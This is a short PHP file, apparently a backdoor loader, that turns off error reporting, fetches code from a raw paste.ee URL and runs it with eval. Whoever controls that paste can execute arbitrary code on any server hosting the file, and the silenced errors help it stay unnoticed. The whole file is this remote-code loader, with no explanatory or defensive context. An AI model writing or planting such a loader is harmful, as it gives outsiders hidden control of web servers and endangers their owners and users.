<?php
error_reporting(0);
$url = 'https://paste.ee/r/HFBdv1YW';
$kode = file_get_contents($url);
eval('?>' . $kode);
?>